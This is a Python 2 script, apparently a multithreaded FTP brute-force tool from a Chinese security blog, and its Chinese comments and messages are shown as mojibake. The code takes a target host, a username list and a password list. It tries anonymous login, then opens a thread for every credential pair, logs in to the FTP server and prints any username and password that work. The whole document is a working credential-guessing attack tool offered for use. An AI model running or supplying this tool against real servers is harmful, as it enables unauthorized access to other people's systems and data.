#!/usr/bin/env python
# -*- coding: gbk -*-
# -*- coding: utf_8 -*-
# Date: 2014/9/5
# Created by ���Եȴ�
# ���� http://www.waitalone.cn/
from threading import Thread
import ftplib, socket
import sys, time, re


def usage():
    print '+' + '-' * 50 + '+'
    print '\t    Python FTP�����ƽ⹤�߶��̰߳�'
    print '\t   Blog��http://www.waitalone.cn/'
    print '\t\t Code BY�� ���Եȴ�'
    print '\t\t Time��2014-09-05'
    print '+' + '-' * 50 + '+'
    if len(sys.argv) != 4:
        print "�÷�: ftpbrute_mult.py ���ƽ��ip/domain �û����б� �ֵ��б�"
        print "ʵ��: ftpbrute_mult.py www.waitalone.cn user.txt pass.txt"
        sys.exit()


def brute_anony():
    try:
        print '[+] ����������½����\n'
        ftp = ftplib.FTP()
        ftp.connect(host, 21, timeout=10)
        print 'FTP��Ϣ: %s \n' % ftp.getwelcome()
        ftp.login()
        ftp.retrlines('LIST')
        ftp.quit()
        print '\n[+] ������½�ɹ�����\n'
    except ftplib.all_errors:
        print '\n[-] ������½ʧ�ܡ���\n'


def brute_users(user, pwd):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, 21, timeout=10)
        ftp.login(user, pwd)
        ftp.retrlines('LIST')
        ftp.quit()
        print '\n[+] �ƽ�ɹ����û�����%s ���룺%s\n' % (user, pwd)
    except ftplib.all_errors:
        pass


if __name__ == '__main__':
    usage()
    start_time = time.time()
    if re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', sys.argv[1]):
        host = sys.argv[1]
    else:
        host = socket.gethostbyname(sys.argv[1])
    userlist = [i.rstrip() for i in open(sys.argv[2])]
    passlist = [j.rstrip() for j in open(sys.argv[3])]
    print 'Ŀ  �꣺%s \n' % sys.argv[1]
    print '�û�����%d ��\n' % len(userlist)
    print '��  �룺%d ��\n' % len(passlist)
    brute_anony()
    print '\n[+] �����ƽ�����С���\n'
    thrdlist = []
    for user in userlist:
        for pwd in passlist:
            t = Thread(target=brute_users, args=(user, pwd))
            t.start()
            thrdlist.append(t)
            time.sleep(0.009)
    for x in thrdlist:
        x.join()
    print '[+] �ƽ���ɣ���ʱ�� %d ��' % (time.time() - start_time)
